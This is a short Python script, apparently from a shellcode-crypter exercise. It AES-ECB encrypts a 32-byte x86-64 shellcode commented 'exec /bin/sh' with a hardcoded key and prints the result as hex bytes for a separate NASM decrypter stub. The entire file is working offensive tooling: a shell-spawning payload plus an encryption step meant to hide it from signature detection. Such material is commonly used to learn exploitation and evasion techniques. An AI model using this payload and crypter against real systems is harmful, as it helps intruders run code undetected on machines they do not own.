#!/usr/bin/env python3
from Crypto.Cipher import AES

# exec /bin/sh
shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"

encrypted = b""
encrypted_str = ""

print("Shellcode length: ", len(shellcode))

if(len(shellcode) % 16 != 0):
    print("WARNING: Plaintext shellcode length must be multiple of 16, pad with NOPs")




 
key = b"\x2b\x7e\x15\x16\x28\xae\xd2\xa6\xab\xf7\x15\x88\x09\xcf\x4f\x3c"
 
cipher = AES.new(key, AES.MODE_ECB)
msg = cipher.encrypt(shellcode)

for x in bytearray(msg):
	encrypted_str += '0x'
	encrypted_str += '%02x,' %x

print(encrypted_str)

print("TODO: Please adjust rcx value in decrypter.nasm to len(shellcode)/16")